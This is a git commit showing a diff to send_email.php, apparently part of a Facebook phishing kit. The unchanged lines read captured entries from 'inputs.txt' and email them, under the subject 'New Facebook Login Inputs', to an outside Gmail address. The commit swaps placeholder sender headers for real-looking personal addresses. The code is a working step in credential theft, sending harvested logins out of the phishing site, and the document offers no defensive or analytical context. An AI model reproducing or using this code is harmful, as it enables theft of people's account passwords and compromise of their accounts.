7a55723452c3cde9fe076d92998138fcac3ea6aa
John Laurence Cabaja-an <87767810+johnlcstudios@users.noreply.github.com>
2024-03-06 15:20:27 +0800

    Update send_email.php

--- send_email.php
+++ send_email.php
@@ -4,8 +4,8 @@ $emailTo = "mrsomebodyfromearth@gmail.com";
 $subject = "New Facebook Login Inputs";
 $message = file_get_contents("inputs.txt");
 $headers = "Content-type: text/plain; charset=UTF-8" . PHP_EOL;
-$headers .= "From: Your Name <jlcabajaan@example.com>" . PHP_EOL;
-$headers .= "Reply-To: JohnLC <jlcabajaan@example.com>" . PHP_EOL;
+$headers .= "From: Your Name <jlcabajaan@gmail.com>" . PHP_EOL;
+$headers .= "Reply-To: JohnLC <jlcabajaan@gmail.com>" . PHP_EOL;
 $headers .= "X-Mailer: PHP/" . phpversion();
 
 if (mail($emailTo, $subject, $message, $headers)) {
